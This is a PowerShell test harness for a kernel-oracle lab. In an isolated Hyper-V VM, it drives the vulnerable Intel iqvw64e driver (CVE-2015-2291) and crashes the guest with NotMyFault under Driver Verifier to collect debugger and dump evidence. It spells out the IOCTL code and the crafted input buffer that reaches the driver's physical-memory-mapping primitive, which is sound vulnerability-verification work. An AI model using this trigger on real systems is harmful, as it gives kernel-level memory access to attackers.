#requires -RunAsAdministrator
<#
  run-m0-controls.ps1 — M0 positive-control run for the winoracle kernel oracle.

  Arm A (WITNESS lane, iqvw64e CVE-2015-2291 NalMmapAddressEx):
    boot under kd (serial pipe) with deferred breakpoints at the MmMapIoSpace call
    site (iqvw64e+0x2a14, operand capture) and the return site (+0x2a1a, readback
    compare dq /p vs dq rax), then drive IOCTL 0x80862007 cmd=57 phys=0x1000
    len=0x1000 via the in-guest trigger. Controls: cmd=99 (bogus) and cmd=57 len=0
    must NOT hit the breakpoints.

  Arm B (CRASH lane, myfault.sys buffer-overflow under Verifier Special Pool):
    boot, verify verifier armed (fail-closed), invoke NotMyFault console crash,
    guest bugchecks + writes a minidump + autoreboots; pull the minidump, run host
    cdb !analyze -v, and emit the evidence for the PoV gate.

  All artifacts land in C:\oracle-lab\evidence\<timestamp>\ for the offline gate.
  SAFETY: only touches the winoracle VM; restore-checkpoint returns it to oracle-base.
#>
[CmdletBinding()]
param(
  [ValidateSet('witness','crash','all')]
  [string]$Arm = 'all',
  [string]$VmName = 'winoracle',
  [string]$Root = 'C:\oracle-lab',
  [string]$Checkpoint = 'oracle-base',
  # notmyfaultc64 syntax (v4.50, measured): notmyfaultc.exe [/wait] /crash 0xNN
  # 0x02 = Buffer overflow — the Special-Pool crash-lane target.
  [string]$CrashCode = '0x02',
  [string]$AdminUser = 'Administrator',
  [string]$WitnessDriverSha256 = '4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b'
)

$ErrorActionPreference = 'Stop'
$KD = 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\kd.exe'
$CDB = 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe'
$Evidence = Join-Path $Root ('evidence\m0-' + (Get-Date).ToString('yyyyMMdd-HHmmss'))
New-Item -ItemType Directory -Force -Path $Evidence | Out-Null
$script:KdProc = $null
$script:KdLog = $null
# Guest channel: WinRM over the isolated lab switch (PS Direct proved fragile on
# this host — the Guest Service Interface flipped off mid-session once; WinRM was
# verified answering on tcp/5985 while PS Direct hung). Guest IP is static
# (post-config) on 192.168.200.30, host is 192.168.200.1.
$GuestIP = '192.168.200.30'
Set-Item WSMan:\localhost\Client\TrustedHosts -Value $GuestIP -Concatenate -Force -ErrorAction SilentlyContinue

function Log($m) { $ts = (Get-Date).ToString('s'); Write-Host "[$ts] $m" }

function Get-OracleCred {
  $secretPath = Join-Path $Root "secrets\$VmName.dpapi"
  New-Object System.Management.Automation.PSCredential(
    $AdminUser, (Get-Content $secretPath | ConvertTo-SecureString))
}

function Restore-Oracle {
  $vm = Get-VM -Name $VmName
  if ($vm.State -ne 'Off') { Stop-VM -Name $VmName -TurnOff -Force }
  $cp = Get-VMSnapshot -VMName $VmName -Name $Checkpoint -ErrorAction Stop
  Restore-VMSnapshot -VMSnapshot $cp -Confirm:$false
  # Defensive (touches only winoracle): GSI + the COM1 kd pipe must be present.
  Enable-VMIntegrationService -VMName $VmName -Name 'Guest Service Interface' -ErrorAction SilentlyContinue
  Set-VMComPort -VMName $VmName -Number 1 -Path "\\.\pipe\$VmName-kd" -ErrorAction SilentlyContinue
  Log "restored checkpoint '$Checkpoint'"
}

function Wait-GuestDirect([int]$Minutes = 12) {
  $deadline = (Get-Date).AddMinutes($Minutes)
  while ((Get-Date) -lt $deadline) {
    try {
      $ok = Invoke-Command -VMName $VmName -Credential (Get-OracleCred) -ErrorAction Stop -ScriptBlock { $true }
      if ($ok) { return $true }
    } catch { Start-Sleep -Seconds 15 }
  }
  return $false
}

function Invoke-Guest([scriptblock]$Body, [object[]]$ArgList = @()) {
  # NOTE: the parameter must NOT be named $Args — that collides with the
  # automatic variable and silently swallows the named binding (measured:
  # every argument arrived as $null remotely until renamed).
  Invoke-Command -VMName $VmName -Credential (Get-OracleCred) -ScriptBlock $Body -ArgumentList $ArgList
}

function Start-Kd([string]$Tag, [string]$CmdFile) {
  $script:KdLog = Join-Path $Evidence "kd-$Tag.log"
  # -b: force an immediate break-in on connect. Without it, kd attaches at
  # KdInitSystem but the guest sails through the initial-break window while kd is
  # busy, and the -cf script never executes (measured on the first M0 attempt).
  $args = "-k com:pipe,port=\\.\pipe\$VmName-kd,resets=0,reconnect -b -logo `"$($script:KdLog)`" -cf `"$CmdFile`" -y srv*C:\sym*https://msdl.microsoft.com/download/symbols"
  $script:KdProc = Start-Process -FilePath $KD -ArgumentList $args -PassThru -WindowStyle Hidden
  Log "kd started (pid $($script:KdProc.Id)), log $($script:KdLog)"
}

function Stop-Kd {
  if ($script:KdProc -and -not $script:KdProc.HasExited) {
    Stop-Process -Id $script:KdProc.Id -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
  }
  $script:KdProc = $null
}

function Wait-KdLog([string]$Marker, [int]$Minutes = 15) {
  # Anchor to a full line: the kd command echo itself contains the marker string
  # (bu iqvw64e+... ".echo 0VERSE-WITNESS-OPERANDS; ..."), which false-positive
  # matched on the first run. The real .echo output is a bare marker line.
  $pattern = '(?m)^\s*' + [regex]::Escape($Marker) + '\s*$'
  $deadline = (Get-Date).AddMinutes($Minutes)
  while ((Get-Date) -lt $deadline) {
    if ((Test-Path $script:KdLog) -and ((Get-Content $script:KdLog -Raw -ErrorAction SilentlyContinue) -match $pattern)) { return $true }
    Start-Sleep -Seconds 10
  }
  return $false
}

function Get-KdHitCounts {
  $text = if (Test-Path $script:KdLog) {
    Get-Content $script:KdLog -Raw -ErrorAction SilentlyContinue
  } else { '' }
  [pscustomobject]@{
    operands = ([regex]::Matches($text, '(?m)^\s*0VERSE-WITNESS-OPERANDS\s*$')).Count
    readback = ([regex]::Matches($text, '(?m)^\s*0VERSE-WITNESS-READBACK\s*$')).Count
  }
}

function Assert-NoKdHits([string]$Phase) {
  # Give the serial logger a bounded flush window before deciding that a control
  # was clean. A control hit is terminal: continuing would let its breakpoint
  # evidence be misattributed to the target arm.
  Start-Sleep -Seconds 3
  $hits = Get-KdHitCounts
  if ($hits.operands -ne 0 -or $hits.readback -ne 0) {
    throw "$Phase unexpectedly hit the sink breakpoints (operands=$($hits.operands), readback=$($hits.readback))"
  }
  return $hits
}

# ---------------------------------------------------------------------------
# ARM A — witness lane
# ---------------------------------------------------------------------------
function Run-WitnessArm {
  Log "=== ARM A: witness lane (iqvw64e NalMmapAddressEx) ==="
  $kdCmds = Join-Path $Evidence 'kd-witness.cmds'
  $bpCmds = Join-Path $Evidence 'arm-bps.cmds'
  # Boot-attach (the only attach that works on this pipe — a guest booted without
  # kd never honors break-ins; measured). Arm the sink bps at the iqvw64e.sys
  # module-load event via sxe ld running a SEPARATE script file ($$>a<), which
  # avoids the nested-quote parse failure that killed the inline sxe callback.
  # Plain bp module+RVA evaluates immediately once the module is loaded.
  @'
.echo 0VERSE-DRIVER-LOADED
bp /1 iqvw64e+0x29c0 ".echo 0VERSE-SINK-BYTES; db iqvw64e+0x2a14 L6; gc"
bu iqvw64e+0x2a14 ".echo 0VERSE-WITNESS-OPERANDS; r rcx,rdx; gc"
bu iqvw64e+0x2a1a ".echo 0VERSE-WITNESS-READBACK; dq /p 0x1000 L8; dq rax L8; gc"
.echo 0VERSE-WITNESS-BPS-BOUND
bl
g
'@ | Set-Content $bpCmds -Encoding ascii
  # kd quoted strings process C-style backslash escapes, so the -c path needs
  # doubled backslashes ("\a" in "\arm-bps.cmds" decodes to BEL otherwise and the
  # script file is "not found" — measured).
  $sxeLine = 'sxe -c "$$>a< ' + ($bpCmds -replace '\\', '\\') + '" ld iqvw64e.sys'
  @"
.symopt+0x40
$sxeLine
.echo 0VERSE-KD-ARMED
g
"@ | Set-Content $kdCmds -Encoding ascii

  Restore-Oracle
  Start-Kd -Tag 'witness' -CmdFile $kdCmds
  Start-VM -Name $VmName
  Log "waiting for guest (PS Direct)..."
  if (-not (Wait-GuestDirect)) { throw "guest did not answer PS Direct" }
  Log "waiting for kd to arm breakpoints..."
  $armed = Wait-KdLog -Marker '0VERSE-KD-ARMED' -Minutes 15
  Log "kd armed: $armed"
  if (-not $armed) { throw "kd did not attach/arm during boot" }

  $facts = Invoke-Guest {
    $v = (verifier.exe /querysettings 2>&1 | Out-String) -replace '\s+', ' '
    $driverSha256 = (Get-FileHash -Algorithm SHA256 C:\oracle\iqvw64e.sys).Hash.ToLowerInvariant()
    sc.exe start iqvw64e 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    $running = (& sc.exe query iqvw64e | Out-String) -match 'RUNNING'
    [pscustomobject]@{ verifier = $v.Trim(); driver_running = $running; driver_sha256 = $driverSha256 }
  }
  Log "guest: $($facts | ConvertTo-Json -Compress)"
  if (-not $facts.driver_running) { throw "iqvw64e did not start" }
  if ($facts.verifier -notmatch 'iqvw64e\.sys') { throw "verifier not armed on iqvw64e.sys" }
  if ($facts.driver_sha256 -ne $WitnessDriverSha256.ToLowerInvariant()) {
    throw "iqvw64e hash differs from the RVA-bound witness binary: $($facts.driver_sha256)"
  }
  $bpsBound = Wait-KdLog -Marker '0VERSE-WITNESS-BPS-BOUND' -Minutes 2
  if (-not $bpsBound) { throw "kd did not bind the iqvw64e sink breakpoints after module load" }

  # Control A1: bogus command 99 — sub-dispatcher default, no primitive, no bp.
  $hex99 = '6300000000000000' + ('00' * 48)
  $c1 = Invoke-Guest { param($h) & C:\oracle\ioctl_trigger.exe '\\.\Nal' 0x80862007 "hex:$h" 64 2>&1 | Out-String } -ArgList $hex99
  Log "control A1 (cmd=99): $($c1.Trim())"
  $c1Hits = Assert-NoKdHits -Phase 'control A1'

  # Control A2: cmd=57 len=0 — callee rejects length, no MmMapIoSpace call, no bp.
  # struct (0x38 bytes): cmd(8) + pad(16) + out-slot(8) + phys(8) + len(4) + pad(4) + flag(8)
  $hexLen0 = '3900000000000000' + ('00' * 16) + ('00' * 8) + '0010000000000000' + '00000000' + '00000000' + ('00' * 8)
  $c2 = Invoke-Guest { param($h) & C:\oracle\ioctl_trigger.exe '\\.\Nal' 0x80862007 "hex:$h" 64 2>&1 | Out-String } -ArgList $hexLen0
  Log "control A2 (cmd=57 len=0): $($c2.Trim())"
  $c2Hits = Assert-NoKdHits -Phase 'control A2'
  $sinkBytes = Wait-KdLog -Marker '0VERSE-SINK-BYTES' -Minutes 2
  if (-not $sinkBytes) { throw "iqvw64e dispatch did not reach the runtime byte-binding probe" }
  $bindLog = Get-Content $script:KdLog -Raw
  if ($bindLog -notmatch '(?im)^\s*0VERSE-SINK-BYTES\s*\r?\n[0-9a-f`]+\s+ff 15 16 37 00 00(?:\s|-)') {
    throw "loaded iqvw64e sink bytes do not match the expected call instruction"
  }

  # Witness: cmd=57 phys=0x1000 len=0x1000 mapflag=0 — must hit both breakpoints.
  $hexW = '3900000000000000' + ('00' * 16) + ('00' * 8) + '0010000000000000' + '00100000' + '00000000' + ('00' * 8)
  $w = Invoke-Guest { param($h) & C:\oracle\ioctl_trigger.exe '\\.\Nal' 0x80862007 "hex:$h" 64 2>&1 | Out-String } -ArgList $hexW
  Log "witness (cmd=57 phys=0x1000 len=0x1000): $($w.Trim())"
  $w | Set-Content (Join-Path $Evidence 'trigger-witness.jsonl') -Encoding ascii
  $c1 | Set-Content (Join-Path $Evidence 'trigger-control-cmd99.jsonl') -Encoding ascii
  $c2 | Set-Content (Join-Path $Evidence 'trigger-control-len0.jsonl') -Encoding ascii

  # Fail loud if the drive itself was malformed (first attempt ran an empty
  # buffer through this path and recorded a null result).
  $wJson = ($w.Trim() -replace '^0VERSE-TRIGGER-JSON:', '') | ConvertFrom-Json
  if ($wJson.in_len -ne 56) { throw "witness drive malformed: in_len=$($wJson.in_len), expected 56 :: $($w.Trim())" }
  if (-not $wJson.call_ok) { throw "witness IOCTL failed: win32_error=$($wJson.win32_error) :: $($w.Trim())" }

  Start-Sleep -Seconds 10
  $hitOperands = Wait-KdLog -Marker '0VERSE-WITNESS-OPERANDS' -Minutes 2
  $hitReadback = Wait-KdLog -Marker '0VERSE-WITNESS-READBACK' -Minutes 2
  Log "bp operands hit: $hitOperands; bp readback hit: $hitReadback"

  # count hits with the same anchored full-line match (command echo excluded):
  # controls must not have fired; the witness drive fires exactly one pair.
  $targetHits = Get-KdHitCounts
  $nOperands = $targetHits.operands
  $nReadback = $targetHits.readback
  Log "hit counts: operands=$nOperands readback=$nReadback (expect exactly 1 each)"

  Stop-Kd
  [pscustomobject]@{
    arm = 'witness'
    kd_armed = $armed
    breakpoints_bound = $bpsBound
    driver_sha256 = $facts.driver_sha256
    controls_clean = ($c1Hits.operands -eq 0 -and $c1Hits.readback -eq 0 -and
      $c2Hits.operands -eq 0 -and $c2Hits.readback -eq 0)
    control_cmd99_hits = $c1Hits
    control_len0_hits = $c2Hits
    operands_hits = $nOperands
    readback_hits = $nReadback
    witness_trigger = $w.Trim()
    control_cmd99 = $c1.Trim()
    control_len0 = $c2.Trim()
  } | ConvertTo-Json | Set-Content (Join-Path $Evidence 'arm-witness-result.json') -Encoding ascii
  if (-not $hitOperands -or -not $hitReadback -or $nOperands -ne 1 -or $nReadback -ne 1) {
    throw "target witness did not hit each bound sink breakpoint exactly once (operands=$nOperands, readback=$nReadback)"
  }
  Log "=== ARM A complete ==="
}

# ---------------------------------------------------------------------------
# ARM B — crash lane
# ---------------------------------------------------------------------------
function Run-CrashArm {
  Log "=== ARM B: crash lane (myfault.sys under Special Pool) ==="
  # NO kd attached on this arm: an attached kernel debugger would HALT the box at
  # the bugcheck and the minidump would never be written. The dump + host cdb is
  # the authoritative channel (hyperv_transport precedent); autoreboot returns the
  # guest for evidence pull.
  Restore-Oracle
  Start-VM -Name $VmName
  Log "waiting for guest (PS Direct)..."
  if (-not (Wait-GuestDirect)) { throw "guest did not answer PS Direct" }

  $pre = Invoke-Guest {
    $v = (verifier.exe /querysettings 2>&1 | Out-String) -replace '\s+', ' '
    # Sysinternals EULA must be accepted per-user before any output/crash mode runs
    # (first run prints the EULA and exits — measured on the first attempt).
    New-Item -Path 'HKCU:\Software\Sysinternals\NotMyFault' -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty -Path 'HKCU:\Software\Sysinternals\NotMyFault' -Name 'EulaAccepted' -Value 1 -Type DWord -Force
    $usage = & C:\oracle\notmyfaultc64.exe /accepteula 2>&1 | Out-String
    $dumpsBefore = @(Get-ChildItem C:\Windows\Minidump\*.dmp -ErrorAction SilentlyContinue | ForEach-Object {
      [pscustomobject]@{
        name = $_.Name
        length = $_.Length
        sha256 = (Get-FileHash -Algorithm SHA256 $_.FullName).Hash.ToLowerInvariant()
      }
    })
    [pscustomobject]@{ verifier = $v.Trim(); usage = $usage.Trim(); dumps_before = $dumpsBefore }
  }
  Log "pre: verifier=$($pre.verifier)"
  Log "pre: notmyfault usage=$($pre.usage.Substring(0, [Math]::Min(600, $pre.usage.Length)))"
  $pre | ConvertTo-Json -Depth 4 | Set-Content (Join-Path $Evidence 'crash-pre.json') -Encoding ascii
  if ($pre.verifier -notmatch 'myfault\.sys') { throw "verifier not armed on myfault.sys" }

  # Control B1: usage run produced no crash by construction (guest still alive).
  # Target arm: invoke the crash. The session dies with the box — expect failure;
  # if it RETURNS with output instead, the crash code was rejected — fail loud now.
  Log "invoking notmyfaultc64.exe /accepteula /crash $CrashCode (guest will bugcheck)"
  [pscustomobject]@{ invoked_at_host_utc = [DateTime]::UtcNow.ToString('o'); crash_code = $CrashCode } |
    ConvertTo-Json | Set-Content (Join-Path $Evidence 'crash-invocation.json') -Encoding ascii
  $crashOut = $null
  try {
    $crashOut = Invoke-Guest { param($c) & C:\oracle\notmyfaultc64.exe /accepteula /crash $c 2>&1 | Out-String } -ArgList $CrashCode
  } catch { Log "guest session dropped as expected: $($_.Exception.Message)" }
  if ($crashOut) {
    $crashOut | Set-Content (Join-Path $Evidence 'crash-invoke-output.txt') -Encoding ascii
    throw "crash invocation returned instead of bugchecking: $($crashOut.Trim())"
  }

  # Wait for autoreboot + PS Direct return.
  Log "waiting for the guest to bugcheck + autoreboot..."
  Start-Sleep -Seconds 45
  if (-not (Wait-GuestDirect -Minutes 12)) { throw "guest did not return after bugcheck" }
  Log "guest is back"

  $post = Invoke-Guest {
    $dumps = @(Get-ChildItem C:\Windows\Minidump\*.dmp -ErrorAction SilentlyContinue | ForEach-Object {
      [pscustomobject]@{
        name = $_.Name
        length = $_.Length
        sha256 = (Get-FileHash -Algorithm SHA256 $_.FullName).Hash.ToLowerInvariant()
      }
    })
    [pscustomobject]@{ dumps_after = $dumps }
  }
  $beforeIds = @{}
  foreach ($dump in @($pre.dumps_before)) {
    $beforeIds["$($dump.name.ToLowerInvariant())|$($dump.length)|$($dump.sha256.ToLowerInvariant())"] = $true
  }
  $newDumps = @($post.dumps_after | Where-Object {
    -not $beforeIds.ContainsKey("$($_.name.ToLowerInvariant())|$($_.length)|$($_.sha256.ToLowerInvariant())")
  })
  $post | Add-Member -NotePropertyName new_dumps -NotePropertyValue $newDumps
  Log "post: $($post | ConvertTo-Json -Compress)"
  $post | ConvertTo-Json -Depth 4 | Set-Content (Join-Path $Evidence 'crash-post.json') -Encoding ascii
  if ($newDumps.Count -ne 1) { throw "expected exactly one new minidump identity after bugcheck; observed $($newDumps.Count)" }
  $newDump = $newDumps[0]
  if ($newDump.length -le 0 -or $newDump.sha256 -notmatch '^[0-9a-f]{64}$') {
    throw "new minidump identity is incomplete"
  }

  # Pull the dump via PS Direct and analyze with host cdb (hyperv_transport precedent).
  $localDump = Join-Path $Evidence 'crash.dmp'
  $cred = Get-OracleCred
  $s = New-PSSession -VMName $VmName -Credential $cred
  try {
    Copy-Item -FromSession $s -Path ("C:\Windows\Minidump\" + $newDump.name) -Destination $localDump
  } finally { $s | Remove-PSSession }
  $dumpSha = (Get-FileHash -Algorithm SHA256 $localDump).Hash.ToLowerInvariant()
  if ($dumpSha -ne $newDump.sha256) { throw "copied minidump hash differs from the new guest dump identity" }
  Log "dump pulled ($($newDump.length) bytes, sha256 $dumpSha)"

  $analysis = & $CDB -z $localDump -c '.bugcheck;!analyze -v;q' 2>&1 | Out-String
  $analysis | Set-Content (Join-Path $Evidence 'crash-cdb-analysis.txt') -Encoding ascii
  $sig = $null
  if ($analysis -match '(?m)^\s*BugCheck\s+([0-9A-Fa-f]+)' -and $analysis -match '(?m)^\s*FAILURE_BUCKET_ID:\s*(\S.+?)\s*$') {
    $sig = ('bugcheck-' + $Matches.0) # placeholder; real signature parsed offline by the Python gate
  }
  Stop-Kd
  [pscustomobject]@{
    arm = 'crash'
    dump_file = $localDump
    dump_sha256 = $dumpSha
    analysis_path = (Join-Path $Evidence 'crash-cdb-analysis.txt')
  } | ConvertTo-Json | Set-Content (Join-Path $Evidence 'arm-crash-result.json') -Encoding ascii
  Log "=== ARM B complete ==="
}

try {
  if ($Arm -eq 'witness' -or $Arm -eq 'all') { Run-WitnessArm }
  if ($Arm -eq 'crash' -or $Arm -eq 'all') { Run-CrashArm }
  Log "M0 controls complete. Evidence: $Evidence"
  Write-Host "0VERSE-M0-EVIDENCE-DIR:$Evidence"
} finally {
  Stop-Kd
}
